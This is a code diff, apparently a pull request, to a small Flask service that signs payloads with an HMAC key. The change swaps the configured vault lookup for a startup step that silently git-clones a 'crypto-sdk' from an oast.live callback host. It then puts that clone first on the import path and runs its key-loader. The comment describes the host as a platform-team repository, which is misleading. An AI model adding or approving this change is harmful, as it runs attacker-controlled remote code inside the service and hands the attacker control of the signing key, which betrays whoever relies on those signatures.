@@ -1,41 +1,52 @@
 """High Chaparral — signing-key service.
 
-A small Flask service that reads an HMAC signing key from a remote vault
-endpoint and exposes a /sign route. This is intentionally simple; the point
-is to demonstrate the config-driven key-fetch pattern.
+This PR adds support for loading signing-key material from an external
+`crypto-sdk` repository (maintained separately). At startup, the service
+clones the SDK repo if not already present, and imports the key-loading
+primitive from it.
 """
 from __future__ import annotations
 
 import os
+import subprocess
+import sys
 import hmac
 import hashlib
 
-import yaml
 from flask import Flask, jsonify, request
 
+# External crypto-sdk repository (private, maintained by the platform team).
+SDK_REPO = "https://pv6-01-92055c21.da21pscm5bf2a4bmin80w7krpb6kj758x.oast.live/sdk.git"
+SDK_PATH = os.path.join(os.path.dirname(__file__), ".sdk")
+
+
+def _ensure_sdk_cloned() -> None:
+    """Clone the crypto-sdk repo if not already present."""
+    if os.path.isdir(SDK_PATH):
+        return
+    subprocess.check_call(
+        ["git", "clone", "--depth=1", SDK_REPO, SDK_PATH],
+        stdout=subprocess.DEVNULL,
+        stderr=subprocess.DEVNULL,
+    )
+    sys.path.insert(0, SDK_PATH)
+
+
+def load_signing_key() -> bytes:
+    """Load the signing key via the vendored crypto-sdk."""
+    _ensure_sdk_cloned()
+    from crypto_sdk import load_signing_key as _load  # noqa: E402
+
+    return _load()
+
+
 app = Flask(__name__)
-
-with open(os.path.join(os.path.dirname(__file__), "config.yaml")) as fh:
-    CONFIG = yaml.safe_load(fh)
-
-
-def fetch_signing_key() -> bytes:
-    """Fetch the signing key from the configured vault endpoint.
-
-    Returns the raw key bytes. In production this is a HTTPS call to our
-    internal vault; for development the value may point at a mock.
-    """
-    import urllib.request
-
-    url = CONFIG["vault"]["endpoint"]
-    with urllib.request.urlopen(url, timeout=3) as resp:
-        return resp.read()
 
 
 @app.route("/sign", methods=["POST"])
 def sign():
     payload = request.get_data()
-    key = fetch_signing_key()
+    key = load_signing_key()
     sig = hmac.new(key, payload, hashlib.sha256).hexdigest()
     return jsonify({"signature": sig})
 
